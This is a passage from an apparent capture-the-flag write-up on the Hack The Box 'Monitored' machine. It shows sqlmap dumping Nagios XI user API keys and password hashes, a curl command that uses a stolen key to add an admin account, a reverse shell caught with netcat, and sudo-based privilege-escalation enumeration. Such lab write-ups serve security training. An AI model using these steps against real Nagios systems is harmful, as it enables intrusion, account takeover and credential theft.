class=&quot;nt&quot;&gt;-T&lt;/span&gt; xi_users
+        ___
+       __H__                                                                                                             
+ ___ ___[&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;_____ ___ ___  &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1.7.12#stable&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;                                                                                
+|_ -| &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;.]     | .&lt;span class=&quot;s1&quot;&gt;&apos;| . |                                                                                                
+|___|_  [(]_|_|_|__,|  _|                                                                                                
+      |_|V...       |_|   https://sqlmap.org                                                                             
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;&lt;/span&gt;s responsibility to obey all applicable &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;, state and federal laws. Developers assume no liability and are not responsible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;any misuse or damage caused by this program
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; starting @ 22:38:17 /2024-01-16/
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:17] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing connection to the target URL
+you have not declared cookie&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;server wants to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;its own &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;nagiosxi=sncb97hqvcq...s60dv5asic&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to use those &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target is protected by some kind of WAF/IPS
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:18] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;the target URL content is stable
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:19] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] target URL content is stable
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] heuristic &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;basic&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;shows that GET parameter &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt; might be injectable &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;possible DBMS: &lt;span class=&quot;s1&quot;&gt;&apos;MySQL&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;SQL injection on GET parameter &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;
+it looks like the back-end DBMS is &lt;span class=&quot;s1&quot;&gt;&apos;MySQL&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Do you want to skip &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;payloads specific &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;other DBMSes? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] testing &lt;span class=&quot;s1&quot;&gt;&apos;AND boolean-based blind - WHERE or HAVING clause&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;22:38:20] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] reflective value&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; found and filtering out
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+Database: nagiosxi
+Table: xi_users
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2 entries]
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | &lt;span class=&quot;nv&quot;&gt;$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C&lt;/span&gt; | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
+| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | &lt;span class=&quot;nv&quot;&gt;$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK&lt;/span&gt; | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705449034   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 8              | 1699697433           |
++---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we found the administrator’s API key and password. Using &lt;a href=&quot;https://www.tunnelsup.com/hash-analyzer/&quot;&gt;Hash Analyzer&lt;/a&gt; we can see that the password is using bcrypt hash. I’ve tried to find a match with John The Ripper, but with no success. So this got me thinking… Maybe we can use the administrator API key to create another admin account within Nagios XI, then log in with it.
+Again, with a bit research, we can find &lt;a href=&quot;https://support.nagios.com/forum/viewtopic.php?f=16&amp;amp;t=42923&quot;&gt;this&lt;/a&gt; topic, where it says
+we can create an accout with this cURL command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -XPOST &quot;http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;amp;pretty=1&quot; -d &quot;username=jmcdouglas&amp;amp;password=test&amp;amp;name=Jordan%20McDouglas&amp;amp;email=jmcdouglas@localhost&quot;&lt;/code&gt;. However, this will create a normal user. We need an admin user. Then, I found (this)[https://www.exploit-db.com/exploits/44969] on exploit-db, which is a completely different exploit, but has these lines:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_add_admin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;vprint_status&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;STEP 3: trying to add admin user with key #{key}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;send_request_cgi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/nagiosxi/api/v1/system/user&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ctype&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vars_get&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;apikey&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pretty&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
+      &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;vars_post&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rand_text_alpha&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;#{username}@localhost&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;auth_level&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;force_pw_change&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that it tries to create/add an admin account, and it passes a parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_level=admin&lt;/code&gt;. Let’s combine cURL with this information and try to create this admin account:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;amp;pretty=1&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=mula&amp;amp;password=mula&amp;amp;name=mula&amp;amp;email=mula@localhost&amp;amp;auth_level=admin&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;User account mula was added successfully!&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;: 6
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we try to login within the browser:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored8.png&quot; alt=&quot;login successful&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok! Now we are inside Nagios XI and logged in as administrator:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored9.png&quot; alt=&quot;admin panel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After poking around the application and looking for its documentation, I stumbled upon &lt;a href=&quot;https://documentation.sysaid.com/docs/configure-nagios-xi-integration&quot;&gt;this&lt;/a&gt; topic that explains how one can add and execute commands within Nagios XI. We need to configure a new command at Configure &amp;gt; Core Config Manager &amp;gt; Commands &amp;gt; Add New and we are able to pass any command we like. Alright, let’s pass it a reverse shell then!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored10.png&quot; alt=&quot;admin panel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;To run the command, we go to Services (left panel) &amp;gt; Add New and inside the Check command dropdown input, we select rev_shell. Then we click on Run Check Command. Don’t forget to leave your netcat listening before hitting this button!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4242
+Connection from 10.129.37.52:54666
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14645&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;nagios
+nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls       
+ls
+&lt;/span&gt;cookie.txt
+user.txt
+nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...redacted...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Granting us the user shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---system-enumeration&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 3 - System enumeration&lt;/h2&gt;
+
+&lt;p&gt;My first enumeration command was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and the output impressed me:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;nagios on localhost:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User nagios may run the following commands on localhost:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios start
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios stop
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios restart
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios reload
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios status
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/nagios checkconfig
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd start
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd stop
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd restart
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd reload
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/npcd status
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/components/autodiscover_new.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/php
+        /usr/local/nagiosxi/scripts/migrate/migrate.php &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So many different possibilities here! After looking at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sh&lt;/code&gt; files, I’ve found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;manage_services.sh&lt;/code&gt; was used to start, stop and check status of npcd. Here’s the output of npcd status:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/nagiosxi/scripts/manage_services.sh status npcd
+&amp;lt;cal/nagiosxi/scripts/manage_services.sh status npcd
+● npcd.service - Nagios Process Control Daemon
+     Loaded: loaded &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/etc/systemd/system/npcd.service&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; enabled&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; vendor preset: enabled&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+     Active: active &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;running&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; since Tue 2024-01-16 17:29:58 EST&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 4h 1min ago
+   Main PID: 727 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;npcd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+      Tasks: 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;limit: 4661&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+     Memory: 276.0K
+        CPU: 228ms
+     CGroup: /system.slice/npcd.service
+             └─727 /usr/local/nagios/bin/npcd &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/local/nagios/etc/pnp/npcd.cfg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;npcd.service&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/nagios/bin/npcd&lt;/code&gt; when running. But we also have write privileges on this directory and in the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/nagios/bin
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/nagios/bin
+total 2192
+drwxr-xr-x 2 nagios nagios    4096 Nov  9 10:43 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios  717648 Nov  9 10:40 nagios
+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios   43648 Nov  9 10:40 nagiostats
